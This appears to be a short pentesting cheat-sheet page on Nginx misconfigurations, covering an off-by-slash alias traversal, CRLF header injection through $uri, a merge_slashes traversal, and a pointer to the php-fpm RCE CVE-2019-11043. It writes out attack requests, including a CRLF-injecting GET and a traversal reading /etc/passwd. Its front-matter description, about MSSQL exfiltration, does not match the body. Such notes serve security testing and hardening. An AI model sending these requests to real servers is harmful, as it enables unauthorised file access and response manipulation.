---
title: "Nginx"
description: "Tips to exfiltrate information from a MSSQL database."
date: 31/07/2019
categories:
 - web
tags:
 - nginx
 - web
---

## Misconfiguration

Configuration file may include vulnerabilities allowing an attacker to access files
out of the root folder or injecting headers.


### Missing slash (Off-By-Slash)

Here is a miss-configuration in the the `nginx.conf` file:

```nginx
# static files
location /static {
    alias /srv/app/static/;
}
```

The location value does not end with a `/` but the alias value does. Which means that if we query: `https://example.com/static../foo` then the location will match and will concatenate `../foo` to the alias, which gives us this local file access: `/srv/app/static/../foo`


### `$uri` normalization leads to CRLF injection

The variable `$uri` (and `$document_uri`) is normaized, that mean URLencoded chars
will be decoded. If this variable is used in a redirection or in `rewrite` then
it's possible to inject characters in `Location` header:

```j2
location / {
    return 302 https://$host$uri;
}
location / {
    rewrite ^ https://$host/$uri;
}
```

Here is an example with the following request:

```http
GET /notexist%0d%0aX-Vincd:%20New-Header-Value HTTP/1.0
Host: vincd.com
```

The response will be something like:

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx
...
Location: https://vincd.com/notexist
X-Vincd: New-Header-Value
```

### `merge_slashes` set to off

The [`merge_slashes`](http://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes)
directive is a mecanisme to to merge two consecutive slashes. By default this
confguration is set to `on`.

If the configuration is set to `off` and the reversed-proxy application is 
vulnerable to `Local-File-Inclusion` then it's possible to exploit it.
[This article](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)
from `Danny Robinson` and `Roten Bar` detailed this exploitation.

```http
GET /////../../../../../etc/passwd HTTP/1.1
Host: vincd.com
```


## RCE in php-fpm (CVE-2019-11043)

If a webserver runs nginx + php-fpm and nginx have a configuration like

```nginx
location ~ [^/]\.php(/|$) {
  ...
  fastcgi_split_path_info ^(.+?\.php)(/.*)$;
  fastcgi_param PATH_INFO $fastcgi_path_info;
  fastcgi_pass            php:9000;
  ...
}
```

More informations on [https://github.com/neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam).
